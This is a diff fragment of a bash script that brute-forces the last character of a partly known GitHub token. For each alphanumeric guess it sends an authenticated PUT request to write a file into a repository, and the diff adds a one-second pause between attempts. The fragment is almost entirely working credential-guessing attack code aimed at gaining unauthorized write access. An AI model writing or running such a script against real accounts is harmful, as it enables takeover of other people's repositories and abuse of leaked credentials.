@@ -20,6 +20,7 @@ for f in {a..z} {A..Z} {0..9}; do
     echo "${TOKEN_VAL:0:39}$f" 
     Header="Authorization: token ${TOKEN_VAL:0:39}$f"
     echo "$Header"
+    sleep 1
     curl -L \
          --request PUT \
          --url "https://api.github.com/repos/${REPO}/contents/README2.md" \
